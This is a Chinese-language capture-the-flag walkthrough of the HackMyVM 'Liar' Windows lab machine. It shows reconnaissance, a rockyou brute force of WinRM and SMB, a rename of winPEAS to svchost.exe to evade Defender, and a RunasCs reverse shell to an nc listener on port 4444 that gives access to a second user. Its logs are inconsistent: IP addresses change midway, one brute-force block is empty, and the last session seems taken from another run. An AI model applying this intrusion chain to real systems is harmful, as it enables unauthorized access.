---
title: HMV-Liar
description: 'Hack and Fun.'
pubDate: 2026-01-15
image: /machine/Liar.png
categories:
  - Documentation
tags:
  - Hackmyvm
  - Windows Machine
---

![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768477427944-fd6003a4-0c55-4410-ab07-d187f9f41dd8.png)

# 信息收集
## IP定位
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# arp-scan -l | grep "08:00:27"

192.168.0.103   08:00:27:e2:94:78       (Unknown)
```

## nmap扫描
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# nmap -Pn -sTCV -T4 -p0-65535 192.168.0.103
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-15 06:42 EST
Nmap scan report for 192.168.0.103
Host is up (0.00032s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                
|_http-title: Not Found                                                                                              
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                          
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                
|_http-title: Not Found                                                                                              
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                          
49664/tcp open  msrpc         Microsoft Windows RPC                                                                  
49665/tcp open  msrpc         Microsoft Windows RPC                                                                  
49666/tcp open  msrpc         Microsoft Windows RPC                                                                  
49667/tcp open  msrpc         Microsoft Windows RPC                                                                  
49668/tcp open  msrpc         Microsoft Windows RPC                                                                  
49679/tcp open  msrpc         Microsoft Windows RPC                                                                  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                             
                                                                                                                     
Host script results:                                                                                                 
| smb2-time:                                                                                                         
|   date: 2026-01-15T11:45:44                                                                                        
|_  start_date: N/A                                                                                                  
|_clock-skew: 2s                                                                                                     
| smb2-security-mode:                                                                                                
|   3:1:1:                                                                                                           
|_    Message signing enabled but not required                                                                       
|_nbstat: NetBIOS name: WIN-IURF14RBVGV, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:e2:94:78 (Oracle VirtualBox virtual NIC)                                                                                                          
                                                                                                                     
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                       
Nmap done: 1 IP address (1 host up) scanned in 194.94 seconds  
```

## 80端口
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# dirsearch -u http://192.168.0.103/

  _|. _ _  _  _  _ _|_    v0.4.3.post1   
 (_||| _) (/_(_|| (_| )                  
                                         
Extensions: php, aspx, jsp, html, js
HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.0.103/__26-01-15_06-47-40.txt

Target: http://192.168.0.103/

[06:47:40] Starting:                     
[06:47:41] 403 -  312B  - /%2e%2e//google.com                                     
[06:47:41] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                   
[06:47:45] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd                 
[06:47:57] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd           

Task Completed 
```



## enum4linux
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# enum4linux 192.168.0.103
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jan 15 06:53:12 2026

 =========================================( Target Information )=========================================                  
                                         
Target ........... 192.168.0.103         
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.0.103 )===========================                   
                                         
                                         
[+] Got domain/workgroup name: WORKGROUP 
                                         
                                         
 ===============================( Nbtstat Information for 192.168.0.103 )===============================                   
                                         
Looking up status of 192.168.0.103       
        WIN-IURF14RBVGV <00> -         B <ACTIVE>  Workstation Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WIN-IURF14RBVGV <20> -         B <ACTIVE>  File Server Service

        MAC Address = 08-00-27-E2-94-78

 ===================================( Session Check on 192.168.0.103 )===================================                  
                                         
                                         
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.                             
```

## smbclient
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# smbclient -L 192.168.0.103 -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

# 漏洞利用
## [http://192.168.0.102](http://192.168.0.102/)
```plain
Hey bro, You asked for an easy Windows VM, enjoy it. - nica
```

得到用户nica

## 密码爆破
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# crackmapexec winrm 192.168.0.102 -u nica -p ../tools/wordlists/kali/rockyou.txt

...
WINRM       192.168.0.102   5985   WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore (Pwn3d!)
```

成功获得凭据nica/hardcore

当然用smb爆破同效

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# crackmapexec smb 192.168.0.102 -u nica -p ../tools/wordlists/kali/rockyou.txt

...
SMB         192.168.0.102   445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore 
```

# 二次信息收集
## evil-winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# evil-winrm -i 192.168.0.102 -u nica -p hardcore

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nica\Documents> cd ../
*Evil-WinRM* PS C:\Users\nica> dir


    Directorio: C:\Users\nica


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018   9:12 AM                Desktop
d-r---        9/26/2023   6:44 PM                Documents
d-r---        9/15/2018   9:12 AM                Downloads
d-r---        9/15/2018   9:12 AM                Favorites
d-r---        9/15/2018   9:12 AM                Links
d-r---        9/15/2018   9:12 AM                Music
d-r---        9/15/2018   9:12 AM                Pictures
d-----        9/15/2018   9:12 AM                Saved Games
d-r---        9/15/2018   9:12 AM                Videos
-a----        9/26/2023   6:44 PM             10 user.txt
*Evil-WinRM* PS C:\Users\nica> type user.txt
HMVWINGIFT
```

## enum4linux
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# enum4linux -a -u "nica" -p "hardcore" 192.168.0.102
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jan 16 20:08:50 2026

 =========================================( Target Information )=========================================

Target ........... 192.168.0.102
RID Range ........ 500-550,1000-1050
Username ......... 'nica'
Password ......... 'hardcore'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.0.102 )===========================
                                                                                     
                                                                                     
[+] Got domain/workgroup name: WORKGROUP                                             
                                                                                     
                                                                                     
 ===============================( Nbtstat Information for 192.168.0.102 )===============================                                                                  
                                                                                     
Looking up status of 192.168.0.102                                                   
        WIN-IURF14RBVGV <20> -         B <ACTIVE>  File Server Service
        WIN-IURF14RBVGV <00> -         B <ACTIVE>  Workstation Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name

        MAC Address = 08-00-27-27-6D-2C

 ===================================( Session Check on 192.168.0.102 )===================================                                                                 
                                                                                     
                                                                                     
[+] Server 192.168.0.102 allows sessions using username 'nica', password 'hardcore'  
                                                                                     
                                                                                     
 ================================( Getting domain SID for 192.168.0.102 )================================                                                                 
                                                                                     
Domain Name: WORKGROUP                                                               
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                 
                                                                                     
                                                                                     
 ==================================( OS information on 192.168.0.102 )==================================                                                                  
                                                                                     
                                                                                     
[E] Can't get OS info with smbclient                                                 
                                                                                     
                                                                                     
[+] Got OS info for 192.168.0.102 from srvinfo:                                      
        192.168.0.102  Wk Sv NT SNT                                                  
        platform_id     :       500
        os version      :       10.0
        server type     :       0x9003


 =======================================( Users on 192.168.0.102 )=======================================                                                                 
                                                                                     
Use of uninitialized value $users in print at ./enum4linux.pl line 972.              
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 192.168.0.102 )=================================                                                                 
                                                                                     
do_connect: Connection to 192.168.0.102 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.0.102                                        
                                                                                     
//192.168.0.102/ADMIN$  Mapping: DENIED Listing: N/A Writing: N/A                    
//192.168.0.102/C$      Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                       
                                                                                     
NT_STATUS_NO_SUCH_FILE listing \*                                                    
//192.168.0.102/IPC$    Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.0.102 )===========================                                                                  
                                                                                     
                                                                                     
[E] Unexpected error from polenum:                                                   
                                                                                     
                                                                                     

[+] Attaching to 192.168.0.102 using nica:hardcore

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:192.168.0.102)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: rpc_s_access_denied



[E] Failed to get password policy with rpcclient                                     
                                                                                     
                                                                                     

 ======================================( Groups on 192.168.0.102 )======================================                                                                  
                                                                                     
                                                                                     
[+] Getting builtin groups:                                                          
                                                                                     
                                                                                     
[+]  Getting builtin group memberships:                                              
                                                                                     
                                                                                     
[+]  Getting local groups:                                                           
                                                                                     
                                                                                     
[+]  Getting local group memberships:                                                
                                                                                     
                                                                                     
[+]  Getting domain groups:                                                          
                                                                                     
                                                                                     
[+]  Getting domain group memberships:                                               
                                                                                     
                                                                                     
 ==================( Users on 192.168.0.102 via RID cycling (RIDS: 500-550,1000-1050) )==================                                                                 
                                                                                     
                                                                                     
[I] Found new SID:                                                                   
S-1-5-32                                                                             

[I] Found new SID:                                                                   
S-1-5-32                                                                             

[I] Found new SID:                                                                   
S-1-5-32                                                                             

[I] Found new SID:                                                                   
S-1-5-32                                                                             

[I] Found new SID:                                                                   
S-1-5-32                                                                             

[+] Enumerating users using SID S-1-5-80-3139157870-2983391045-3678747466-658725712 and logon username 'nica', password 'hardcore'                                        
                                                                                     
                                                                                     
[+] Enumerating users using SID S-1-5-90 and logon username 'nica', password 'hardcore'                                                                                   
                                                                                     
                                                                                     
[+] Enumerating users using SID S-1-5-32 and logon username 'nica', password 'hardcore'                                                                                   
                                                                                     
S-1-5-32-544 BUILTIN\Administradores (Local Group)                                   
S-1-5-32-545 BUILTIN\Usuarios (Local Group)
S-1-5-32-546 BUILTIN\Invitados (Local Group)
S-1-5-32-547 BUILTIN\Usuarios avanzados (Local Group)
S-1-5-32-550 BUILTIN\Opers. de impresión (Local Group)

[+] Enumerating users using SID S-1-5-80 and logon username 'nica', password 'hardcore'                                                                                   
                                                                                     
                                                                                     
[+] Enumerating users using SID S-1-5-82-3006700770-424185619-1745488364-794895919 and logon username 'nica', password 'hardcore'                                         
                                                                                     
                                                                                     
 ===============================( Getting printer info for 192.168.0.102 )===============================                                                                 
                                                                                     
do_cmd: Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND      


enum4linux complete on Fri Jan 16 20:09:13 2026

```

## winPEAS
```plain
*Evil-WinRM* PS C:\Users\nica\Documents> upload ../../../../../../home/kali/Desktop/tools/peass/winpeas/winPEASx64.exe
                                        
Info: Uploading /home/kali/Desktop/hmv/../../../../../../home/kali/Desktop/tools/peass/winpeas/winPEASx64.exe to C:\Users\nica\Documents\winPEASx64.exe                   
                                        
Data: 13561172 bytes of 13561172 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\nica\Documents> .\winPEASx64.exe 
*Evil-WinRM* PS C:\Users\nica\Documents> .\winPEASx64.exe quiet
*Evil-WinRM* PS C:\Users\nica\Documents> 

*Evil-WinRM* PS C:\Users\nica\Documents> upload ../../../../../../home/kali/Desktop/tools/peass/winpeas/winPEAS.ps1
                                        
Info: Uploading /home/kali/Desktop/hmv/../../../../../../home/kali/Desktop/tools/peass/winpeas/winPEAS.ps1 to C:\Users\nica\Documents\winPEAS.ps1                         
                                        
Data: 108048 bytes of 108048 bytes copied
                                        
Info: Upload successful!

*Evil-WinRM* PS C:\Users\nica\Documents> dir


    Directorio: C:\Users\nica\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/17/2026   2:18 AM          60858 winPEAS.ps1

*Evil-WinRM* PS C:\Users\nica\Documents> upload ../../../../../../home/kali/Desktop/tools/peass/winpeas/winPEAS.ps1


*Evil-WinRM* PS C:\Users\nica\Documents> rename-item winPEASx64.exe svchost.exe
.\svchost.exe
 
*Evil-WinRM* PS C:\Users\nica\Documents> cmd /c svchost.exe
 
cmd.exe : El sistema no puede ejecutar el programa especificado.
    + CategoryInfo          : NotSpecified: (El sistema no p...a especificado.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\Users\nica\Documents> dir


    Directorio: C:\Users\nica\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/17/2026   2:18 AM          60858 winPEAS.ps1


*Evil-WinRM* PS C:\Users\nica\Documents> 
```

+ Defender 开启 ✅
+ WinRM 环境 ✅
+ PEAS 全系被杀 ✅

没招了

## 枚举用户
```plain
*Evil-WinRM* PS C:\Users\nica\Documents> whoami /all

INFORMACIàN DE USUARIO
----------------------

Nombre de usuario    SID
==================== ==============================================
win-iurf14rbvgv\nica S-1-5-21-2519875556-2276787807-2868128514-1000


INFORMACIàN DE GRUPO
--------------------

Nombre de grupo                              Tipo           SID          Atributos
============================================ ============== ============ ========================================================================
Todos                                        Grupo conocido S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                             Alias          S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios de administraci¢n remota    Alias          S-1-5-32-580 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\NETWORK                         Grupo conocido S-1-5-2      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados         Grupo conocido S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compa¤¡a                   Grupo conocido S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Cuenta local                    Grupo conocido S-1-5-113    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Autenticaci¢n NTLM              Grupo conocido S-1-5-64-10  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria\Nivel obligatorio medio Etiqueta       S-1-16-8192


INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                  Estado
============================= ============================================ ==========
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada

*Evil-WinRM* PS C:\Users\nica\Documents> net user

Cuentas de usuario de \\

-------------------------------------------------------------------------------
Administrador            akanksha                 DefaultAccount
Invitado                 nica                     WDAGUtilityAccount
El comando se ha completado con uno o m s errores.
```

得到新用户akanksha

尝试爆破

## 密码爆破
```plain

```

得到了用户和密码

```plain
akanksha
sweetgirl
```

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# evil-winrm -i 192.168.0.102 -u 'akanksha' -p 'sweetgirl'   

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError                                                                
                                        
Error: Exiting with code 1

```

登不上去

# 提权
## 利用
 需要使用 `https://github.com/antonioCoco/RunasCs` 这一工具来解决凭证不匹配的问题： 

_RunasCs_ 是一个实用程序，用于使用与用户当前登录使用显式凭据提供的权限不同的权限来运行特定进程。该工具是 Windows 内置 _runas.exe_ 的改进开放版本，解决了一些限制：

+ 允许显式凭据
+ 如果从交互进程和服务进程中生成，则都可以工作
+ 正确管理 Window _Station_ 和 * 桌面的 *_DACL_ 以创建新进程
+ 使用更可靠的创建进程函数，例如 `CreateProcessAsUser()` 调用 `CreateProcessWithTokenW()` 进程是否拥有所需的权限（自动检测）
+ 允许指定登录类型，例如 8-NetworkCleartext 登录（无 _UAC_ 限制）
+ 允许在已知管理员密码时绕过 UAC（标志 --bypass-uac）
+ 允许创建一个进程，其主线程模拟请求的用户（标志 --remote-impersonation）
+ 允许将 _stdin_、_stdout_ 和 _stderr_ 重定向到远程主机
+ 它是开源的：

通过登录nica用户借助该工具反弹出akanksha的shell

```plain
RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
```

```plain
 *Evil-WinRM* PS C:\Users\nica\Documents> upload Desktop/tools/RunasCs/RunasCs.exe
                                        
Info: Uploading /home/kali/Desktop/tools/RunasCs/RunasCs.exe to C:\Users\nica\Documents\RunasCs.exe                                                                       
                                        
Data: 1097728 bytes of 1097728 bytes copied
                                        
Info: Upload successful!
```

```plain
*Evil-WinRM* PS C:\Users\nica\Documents> RunasCs.exe akanksha sweetgirl cmd.exe -r 192.168.0.106:4444
The term 'RunasCs.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ RunasCs.exe akanksha sweetgirl cmd.exe -r 192.168.0.106:4444
+ ~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (RunasCs.exe:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\nica\Documents> ls


    Directorio: C:\Users\nica\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/17/2026   3:06 AM         803118 RunasCs.exe
-a----        1/17/2026   2:18 AM          60858 winPEAS.ps1


*Evil-WinRM* PS C:\Users\nica\Documents> ./RunasCs.exe akanksha sweetgirl cmd.exe -r 192.168.0.106:4444
Program 'RunasCs.exe' failed to run: The specified executable is not a valid application for this OS platform.At line:1 char:1
+ ./RunasCs.exe akanksha sweetgirl cmd.exe -r 192.168.0.106:4444
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ ./RunasCs.exe akanksha sweetgirl cmd.exe -r 192.168.0.106:4444
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
*Evil-WinRM* PS C:\Users\nica\Documents> upload Desktop/tools/RunasCs/RunasCs_net2.exe
                                        
Info: Uploading /home/kali/Desktop/tools/RunasCs/RunasCs_net2.exe to C:\Users\nica\Documents\RunasCs_net2.exe                                                             
                                        
Data: 1110696 bytes of 1110696 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\nica\Documents> ./RunasCs_net2.exe akanksha sweetgirl cmd.exe -r 192.168.0.106:4444
Program 'RunasCs_net2.exe' failed to run: The specified executable is not a valid application for this OS platform.At line:1 char:1
+ ./RunasCs_net2.exe akanksha sweetgirl cmd.exe -r 192.168.0.106:4444
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ ./RunasCs_net2.exe akanksha sweetgirl cmd.exe -r 192.168.0.106:4444
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
*Evil-WinRM* PS C:\Users\nica\Documents> 
```

没成功，换个1.4版本

```plain
*Evil-WinRM* PS C:\Users\nica\Documents> upload Desktop/tools/RunasCs/1.4/RunasCs.exe 
                                        
Info: Uploading /home/kali/Desktop/tools/RunasCs/1.4/RunasCs.exe to C:\Users\nica\Documents\RunasCs.exe                                                                   
                                        
Data: 1094312 bytes of 1094312 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\nica\Documents> ls


    Directorio: C:\Users\nica\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/17/2026   3:11 AM         800558 RunasCs.exe
-a----        1/17/2026   3:08 AM         812852 RunasCs_net2.exe
-a----        1/17/2026   2:18 AM          60858 winPEAS.ps1


*Evil-WinRM* PS C:\Users\nica\Documents> ./RunasCs.exe akanksha sweetgirl cmd.exe -r 192.168.0.106:4444
Program 'RunasCs.exe' failed to run: The specified executable is not a valid application for this OS platform.At line:1 char:1
+ ./RunasCs.exe akanksha sweetgirl cmd.exe -r 192.168.0.106:4444
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ ./RunasCs.exe akanksha sweetgirl cmd.exe -r 192.168.0.106:4444
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

```

还是没成功，懒得重置了

```plain
┌──(root㉿kali)-[/home/kali/temp/Liar]
└─# evil-winrm -u nica -p 'hardcore'  -i 192.168.0.102
 
Evil-WinRM shell v3.5
 
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
 
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
 
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nica\Documents> cd ..
*Evil-WinRM* PS C:\Users\nica> upload runascs.exe
 
Info: Uploading /home/kali/temp/Liar/runascs14.exe to C:\Users\nica\runascs14.exe
 
Data: 65536 bytes of 65536 bytes copied
 
Info: Upload successful!
*Evil-WinRM* PS C:\Users\nica> .\runascs.exe akanksha sweetgirl cmd.exe -r 192.168.0.106:4444
[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type 8. Reverting to logon type Interactive (2)...
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-2abf34$\Default
[+] Async process 'cmd.exe' with pid 2936 created and left in background.
```

```plain
┌──(root㉿kali)-[/home/kali/temp/Liar]
└─# nc -lvnp 4444         
listening on [any] 4444 ...
connect to [172.20.10.8] from (UNKNOWN) [172.20.10.6] 49687
Microsoft Windows [Versi�n 10.0.17763.107]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.
 
C:\Windows\system32>whoami /all
whoami /all
 
INFORMACI�N DE USUARIO
----------------------
 
Nombre de usuario        SID                                           
======================== ==============================================
win-iurf14rbvgv\akanksha S-1-5-21-2519875556-2276787807-2868128514-1001
 
INFORMACI�N DE GRUPO
--------------------
 
Nombre de grupo                              Tipo           SID                                            Atributos                                                               
============================================ ============== ============================================== ========================================================================
Todos                                        Grupo conocido S-1-1-0                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
WIN-IURF14RBVGV\Idministritirs               Alias          S-1-5-21-2519875556-2276787807-2868128514-1002 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                             Alias          S-1-5-32-545                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\INTERACTIVE                     Grupo conocido S-1-5-4                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
INICIO DE SESI�N EN LA CONSOLA               Grupo conocido S-1-2-1                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados         Grupo conocido S-1-5-11                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compa��a                   Grupo conocido S-1-5-15                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Cuenta local                    Grupo conocido S-1-5-113                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Autenticaci�n NTLM              Grupo conocido S-1-5-64-10                                    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria\Nivel obligatorio medio Etiqueta       S-1-16-8192                                                                                                            
 
INFORMACI�N DE PRIVILEGIOS
--------------------------
 
Nombre de privilegio          Descripci�n                                  Estado       
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci�n de recorrido             Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
 
C:\Windows\system32>whoami
whoami
win-iurf14rbvgv\akanksha
 
C:\Windows\system32>cd \User
cd \User
El sistema no puede encontrar la ruta especificada.
 
C:\Windows\system32>cd ../../
cd ../../
 
C:\>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 26CD-AE41
 
 Directorio de C:\
 
26/09/2023  15:12    <DIR>          inetpub
15/09/2018  09:12    <DIR>          PerfLogs
15/09/2018  09:21    <DIR>          Program Files
15/09/2018  09:21    <DIR>          Program Files (x86)
26/09/2023  18:44    <DIR>          Users
14/04/2024  18:36    <DIR>          Windows
               0 archivos              0 bytes
               6 dirs  45.687.545.856 bytes libres
 
C:\>cd Users
cd Users
 
C:\Users>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 26CD-AE41
 
 Directorio de C:\Users
 
26/09/2023  18:44    <DIR>          .
26/09/2023  18:44    <DIR>          ..
26/09/2023  18:36    <DIR>          Administrador
26/09/2023  18:41    <DIR>          akanksha
14/04/2024  14:19    <DIR>          nica
26/09/2023  15:11    <DIR>          Public
               0 archivos              0 bytes
               6 dirs  45.687.545.856 bytes libres
 
C:\Users>cd akanksha
cd akanksha
 
C:\Users\akanksha>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 26CD-AE41
 
 Directorio de C:\Users\akanksha
 
26/09/2023  18:41    <DIR>          .
26/09/2023  18:41    <DIR>          ..
15/09/2018  09:12    <DIR>          Desktop
26/09/2023  18:41    <DIR>          Documents
15/09/2018  09:12    <DIR>          Downloads
15/09/2018  09:12    <DIR>          Favorites
15/09/2018  09:12    <DIR>          Links
15/09/2018  09:12    <DIR>          Music
15/09/2018  09:12    <DIR>          Pictures
15/09/2018  09:12    <DIR>          Saved Games
15/09/2018  09:12    <DIR>          Videos
               0 archivos              0 bytes
              11 dirs  45.687.545.856 bytes libres
 
C:\Users\akanksha>cd ../Administrador
cd ../Administrador
 
C:\Users\Administrador>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 26CD-AE41
 
 Directorio de C:\Users\Administrador
 
26/09/2023  18:36    <DIR>          .
26/09/2023  18:36    <DIR>          ..
26/09/2023  15:11    <DIR>          3D Objects
26/09/2023  15:11    <DIR>          Contacts
26/09/2023  15:11    <DIR>          Desktop
26/09/2023  15:11    <DIR>          Documents
26/09/2023  15:11    <DIR>          Downloads
26/09/2023  15:11    <DIR>          Favorites
26/09/2023  15:11    <DIR>          Links
26/09/2023  15:11    <DIR>          Music
26/09/2023  15:24            16.418 new.cfg
26/09/2023  15:11    <DIR>          Pictures
26/09/2023  18:36                13 root.txt
26/09/2023  15:11    <DIR>          Saved Games
26/09/2023  15:11    <DIR>          Searches
26/09/2023  15:11    <DIR>          Videos
               2 archivos         16.431 bytes
              14 dirs  45.687.545.856 bytes libres
 
C:\Users\Administrador>type root.txt
type root.txt
HMV1STWINDOWZ
```











